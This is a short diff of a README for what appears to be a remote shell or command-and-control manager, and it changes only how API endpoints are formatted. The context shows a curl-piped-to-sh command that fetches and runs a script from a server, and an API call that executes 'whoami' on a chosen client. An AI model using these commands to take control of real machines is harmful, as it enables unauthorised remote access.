@@ -76,7 +76,7 @@ sh -c "$(curl http://host:port/)"
 ```
 
 #### RESTful API
-* GET `/client` List all online clients
+* `GET /client` List all online clients
 ```
 # curl 'http://127.0.0.1:9090/client'
 {
@@ -86,7 +86,7 @@ sh -c "$(curl http://host:port/)"
     "status": true
 }
 ```
-* POST `/client` execute a command on a specific client
+* `POST /client/:hash` execute a command on a specific client
 ```
 # curl -X POST 'http://host:port/client/4f571d895f019702e017658f2246a7eb' --data 'cmd=whoami'
 {
